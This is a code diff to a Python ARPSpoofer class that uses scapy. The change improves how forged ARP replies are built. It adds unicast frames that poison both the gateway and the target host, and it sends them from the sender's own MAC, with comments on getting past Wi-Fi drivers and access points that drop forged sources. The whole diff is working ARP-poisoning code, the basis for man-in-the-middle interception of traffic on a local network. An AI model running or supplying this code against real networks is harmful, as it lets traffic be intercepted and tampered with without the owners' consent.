@@ -198,10 +198,18 @@ class ARPSpoofer(threading.Thread):
         ARP, Ether = _scapy()
         from scapy.all import sendp  # noqa: PLC0415
 
+        source_mac = get_if_hwaddr(self.interface)
         frames = [
-            Ether(src=host.mac, dst=BROADCAST)
+            # Unicast first: on Wi-Fi a forged Ethernet source is often dropped
+            # by the driver or access point, so send with our own MAC instead.
+            Ether(src=source_mac, dst=self.gateway_mac)
+            / ARP(op="is-at", hwsrc=host.mac, psrc=host.ip, hwdst=self.gateway_mac, pdst=self.gateway_ip),
+            Ether(src=source_mac, dst=host.mac)
+            / ARP(op="is-at", hwsrc=self.gateway_mac, psrc=self.gateway_ip, hwdst=host.mac, pdst=host.ip),
+            # Broadcast copies as a fallback for switches and sleepy clients.
+            Ether(src=source_mac, dst=BROADCAST)
             / ARP(op="is-at", hwsrc=host.mac, psrc=host.ip, hwdst=BROADCAST, pdst=self.gateway_ip),
-            Ether(src=self.gateway_mac, dst=BROADCAST)
+            Ether(src=source_mac, dst=BROADCAST)
             / ARP(op="is-at", hwsrc=self.gateway_mac, psrc=self.gateway_ip, hwdst=BROADCAST, pdst=host.ip),
         ]
         sendp(frames, iface=self.interface, verbose=0, count=3)
